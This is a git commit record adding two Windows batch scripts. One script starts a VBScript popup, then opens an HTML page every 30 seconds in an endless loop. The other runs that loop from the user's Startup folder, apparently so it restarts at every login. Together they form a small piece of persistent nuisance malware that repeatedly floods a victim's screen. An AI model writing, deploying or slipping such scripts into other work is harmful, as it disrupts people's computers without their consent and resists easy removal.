529906440906199b9b414a5e1598007ec29e6fa1
DeathBotClient <87394115+DeathBotClient@users.noreply.github.com>
2022-01-30 21:27:05 -0500

    Add files via upload

---
+++ server.bat
@@ -0,0 +1,18 @@
+@echo off
+
+start popup.vbs
+
+cd ..
+
+:go
+start founder.html
+timeout 30
+goto go
+
+
+
+
+
+
+
+
---
+++ startup.bat
@@ -0,0 +1,4 @@
+@echo off
+cd %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup
+start server.bat
+exit
